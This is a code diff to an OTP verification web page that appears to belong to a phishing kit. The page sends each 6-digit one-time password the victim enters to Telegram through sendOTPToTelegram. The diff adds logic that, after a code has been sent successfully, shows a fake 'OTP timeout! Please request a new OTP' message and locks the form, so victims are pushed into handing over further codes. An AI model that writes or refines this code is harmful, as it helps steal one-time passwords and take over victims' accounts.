@@ -25,6 +25,7 @@
         .resend { margin-top: 12px; font-size: 0.8rem; }
         .resend a { color: #832625; text-decoration: none; font-weight: 600; }
         .timer { font-size: 0.75rem; color: #999; margin-top: 8px; }
+        .status-message { margin-top: 10px; font-size: 0.8rem; font-weight: 600; color: #d93025; }
     </style>
 </head>
 <body>
@@ -45,10 +46,32 @@
     <script src="telegram-config.js"></script>
     <script>
         let timeLeft = 180;
+        let otpExpired = false;
         const timerEl = document.getElementById('timerDisplay');
+        const otpInput = document.getElementById('otp');
+        const submitBtn = document.querySelector('.btn-submit');
+
+        const showTimeoutPopup = () => {
+            if (otpExpired) return;
+            otpExpired = true;
+            otpInput.disabled = true;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'TIMEOUT';
+            timerEl.textContent = 'OTP expired';
+            alert('OTP timeout! Please request a new OTP and try again.');
+        };
+
         setInterval(() => {
+            if (otpExpired) return;
             timeLeft--;
-            if (timeLeft <= 0) timeLeft = 0;
+            if (timeLeft <= 0) {
+                timeLeft = 0;
+                const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+                const s = String(timeLeft % 60).padStart(2, '0');
+                timerEl.textContent = 'OTP expires in ' + m + ':' + s;
+                showTimeoutPopup();
+                return;
+            }
             const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
             const s = String(timeLeft % 60).padStart(2, '0');
             timerEl.textContent = 'OTP expires in ' + m + ':' + s;
@@ -56,17 +79,38 @@
 
         document.getElementById("otpForm").addEventListener("submit", async function(event) {
             event.preventDefault();
-            const otp = document.getElementById("otp").value;
+            if (otpExpired) {
+                alert('OTP timeout! Please request a new OTP and try again.');
+                return;
+            }
+
+            const otp = otpInput.value;
             if (otp.length !== 6 || !/^\d{6}$/.test(otp)) { alert("Enter valid 6-digit OTP."); return; }
 
-            const btn = document.querySelector(".btn-submit");
-            btn.disabled = true; btn.textContent = "Processing...";
+            submitBtn.disabled = true; submitBtn.textContent = "Processing...";
 
             try {
                 const res = await sendOTPToTelegram(otp);
-                if (res.success) setTimeout(() => window.location.href = "7.html", 500);
-                else { alert("Error: " + (res.error || "Failed")); btn.disabled = false; btn.textContent = "VERIFY OTP"; }
-            } catch (err) { alert("Error occurred"); btn.disabled = false; btn.textContent = "VERIFY OTP"; }
+                if (res.success) {
+                    setTimeout(() => {
+                        otpInput.disabled = true;
+                        submitBtn.disabled = true;
+                        submitBtn.textContent = 'TIMEOUT';
+                        timerEl.textContent = 'OTP expired';
+                        const resend = document.querySelector('.resend');
+                        if (resend) {
+                            resend.innerHTML = '<div class="status-message">OTP timeout! Please request a new OTP and try again.</div>';
+                        }
+                        alert('OTP timeout! Please request a new OTP and try again.');
+                    }, 1000);
+                } else {
+                    alert("Error: " + (res.error || "Failed"));
+                    submitBtn.disabled = false; submitBtn.textContent = "VERIFY OTP";
+                }
+            } catch (err) {
+                alert("Error occurred");
+                submitBtn.disabled = false; submitBtn.textContent = "VERIFY OTP";
+            }
         });
     </script>
 </body>
